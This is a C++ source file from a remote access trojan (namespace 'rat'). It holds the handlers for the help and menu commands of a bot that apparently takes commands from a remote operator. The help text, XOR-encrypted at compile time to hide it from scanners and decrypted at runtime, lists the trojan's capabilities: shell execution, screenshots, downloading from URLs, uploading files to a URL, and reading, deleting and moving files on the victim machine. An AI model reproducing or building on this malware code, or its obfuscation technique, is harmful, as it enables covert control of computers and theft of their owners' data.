#include "rat/Handler.hpp"
#include "rat/encryption/xor.hpp"
#include <array>

#include "rat/handler/debug.hpp"

#define XOR_KEY "ksdjkgjfsdajghfjdahgajkfdhgjakfdhgjkafhdjkfadhgjfadhgjx.[as;;qw;;rfhadfgjhafgjkdhgjkfda"
#define XOR_STRING(str) rat::encryption::xorEncrypt(str, XOR_KEY)

namespace rat::handler {

// compile-time ENCRYPTED_HELP_MESSAGE data
constexpr auto ENCRYPTED_HELP_MESSAGE = XOR_STRING(
    "Available commands:\n"
    "  /screenshot for taking a frame of the screen, depends on ffmpeg being installed\n"
    "  /sh <timeout> command, run a shell command on a watcher thread with a timeout capture its output.\n"
    "  /process <timeout> command, \n"
    "  /menu\n"
    "  /download <url>\n"
    "  /download <url> <dirpath>\n"
    "  /download <url>  <filepath>\n"
    "  /upload <file>   <url>\n"
    "  /pwd\n"
    "  /cd\n"
    "  /ls <path>\n"
    "  /read <filepath>\n"
    "  /touch <filepath>\n"
    "  /get   <filepath>\n"
    "  /stat  <filepath>\n"
    "  /rm    <filepath>\n"
    "  /mv    <filepath> <filepath>\n"
    "  /cp    <filepath> <filepath>\n"
    "  /set   <global>   <value>\n"
    "\n"
    "Dynamic commands:\n"
    "  Use '!' prefix to execute dynamic commands, e.g. !<command>\n"
);

void Handler::handleHelpCommand() {
    // fixed-size buffer, allocated on the stack
    std::array<char, ENCRYPTED_HELP_MESSAGE.size()> message{};
    std::copy(ENCRYPTED_HELP_MESSAGE.begin(), ENCRYPTED_HELP_MESSAGE.end(), message.begin());

    // decrypt in-place
    rat::encryption::xorData(
        reinterpret_cast<uint8_t*>(message.data()),
        message.size(),
        XOR_KEY
    );

    // safe: array is null-terminated because XOR_STRING ENCRYPTED_HELP_MESSAGE the '\0'
    this->bot->sendMessage(message.data());
    //this->bot.sendMessage(ENCRYPTED_HELP_MESSAGE.data());
}

void Handler::handleMenuCommand() {
    this->bot->sendMessage(this->state.listDynamicTools());
}
} // namespace rat::Handler
#undef DEBUG_LOG
#undef ERROR_LOG
#ifdef DEBUG_RAT_HANDLER
    #undef DEBUG_RAT_HANDLER
#endif
